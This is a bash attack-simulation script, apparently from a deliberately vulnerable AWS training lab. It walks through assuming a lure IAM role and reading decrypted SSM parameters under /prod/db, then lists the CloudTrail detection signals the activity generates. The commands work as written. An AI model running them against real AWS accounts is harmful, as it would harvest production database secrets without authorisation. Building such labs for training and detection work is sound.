#!/usr/bin/env bash
#
# abuse.sh — Simulate attacker abuse of Scenario 18 (SSM Parameter Cross-Reference Chain)
#
# This scenario deploys to us-east-1 specifically (see main.tf's provider block),
# so every regional call below is pinned to that region.
#
# This script walks through the attack chain step by step with colored output.
# It assumes the caller has valid AWS credentials for any identity in the account.
#
# Usage:
#   chmod +x abuse.sh
#   ./abuse.sh
#
set -euo pipefail

REGION="us-east-1"

# ---------------------------------------------------------------
# Colors and helpers
# ---------------------------------------------------------------
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

step() { echo -e "\n${CYAN}[STEP $1]${NC} $2"; }
info() { echo -e "  ${GREEN}[+]${NC} $1"; }
warn() { echo -e "  ${YELLOW}[!]${NC} $1"; }
attack() { echo -e "  ${RED}[ATTACK]${NC} $1"; }

echo -e "${RED}"
echo "============================================="
echo "  SCENARIO 18 — ABUSE CHAIN"
echo "  SSM Parameter Cross-Reference Chain"
echo "============================================="
echo -e "${NC}"

# ---------------------------------------------------------------
step "1" "Resolving account identity"
# ---------------------------------------------------------------
ACCOUNT_ID=$(aws sts get-caller-identity --query "Account" --output text)
CALLER_ARN=$(aws sts get-caller-identity --query "Arn" --output text)
info "Account ID: ${ACCOUNT_ID}"
info "Caller ARN: ${CALLER_ARN}"

# ---------------------------------------------------------------
step "2" "Assuming lure role: infra-params-readonly-role"
# ---------------------------------------------------------------
ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/infra-params-readonly-role"
attack "sts:AssumeRole → ${ROLE_ARN}"

CREDS=$(aws sts assume-role \
  --role-arn "${ROLE_ARN}" \
  --role-session-name "recon-session" \
  --query "Credentials" \
  --output json)

export AWS_ACCESS_KEY_ID=$(echo $CREDS | jq -r .AccessKeyId)
export AWS_SECRET_ACCESS_KEY=$(echo $CREDS | jq -r .SecretAccessKey)
export AWS_SESSION_TOKEN=$(echo $CREDS | jq -r .SessionToken)
info "Role assumed successfully"

# ---------------------------------------------------------------
step "3" "Discovering all parameters (ssm:DescribeParameters)"
# ---------------------------------------------------------------
attack "ssm:DescribeParameters"
aws ssm describe-parameters --region "${REGION}" \
  --parameter-filters "Key=Name,Option=BeginsWith,Values=/prod/db" --output table

# ---------------------------------------------------------------
step "4" "Pulling the whole /prod/db tree recursively (ssm:GetParametersByPath)"
# ---------------------------------------------------------------
attack "ssm:GetParametersByPath → /prod/db (recursive)"
aws ssm get-parameters-by-path --region "${REGION}" \
  --path "/prod/db" --recursive --with-decryption --output json \
  | jq '.Parameters[] | {Name, Type, Value}'

# ---------------------------------------------------------------
step "5" "Reading the primary DB connection parameter (ssm:GetParameter)"
# ---------------------------------------------------------------
PARAM_NAME="/prod/db/primary"
attack "ssm:GetParameter → ${PARAM_NAME}"
aws ssm get-parameter --region "${REGION}" --name "${PARAM_NAME}" --with-decryption --output json \
  | jq '.Parameter | {Name, Type, Value}'

# ---------------------------------------------------------------
step "6" "Following the cross-reference chain: replica, backup, encryption, monitoring"
# ---------------------------------------------------------------
for suffix in replica backup-config encryption-config monitoring; do
  attack "ssm:GetParameter → /prod/db/${suffix}"
  aws ssm get-parameter --region "${REGION}" --name "/prod/db/${suffix}" --with-decryption --output json \
    | jq '.Parameter | {Name, Value}'
done
info "Each parameter was reachable from the same role — a single compromised credential"
info "walked the entire database configuration chain in one pass."

# ---------------------------------------------------------------
# Cleanup
# ---------------------------------------------------------------
echo ""
step "7" "Cleaning up session"
unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
info "Session credentials cleared"

echo ""
echo -e "${GREEN}=============================================${NC}"
echo -e "${GREEN}  Abuse chain complete${NC}"
echo -e "${GREEN}=============================================${NC}"
echo ""
echo -e "${YELLOW}Detection signals generated:${NC}"
echo "  • CloudTrail: AssumeRole on infra-params-readonly-role"
echo "  • CloudTrail: DescribeParameters"
echo "  • CloudTrail: GetParametersByPath on /prod/db"
echo "  • CloudTrail: GetParameter on /prod/db/{primary,replica,backup-config,encryption-config,monitoring}"
echo ""
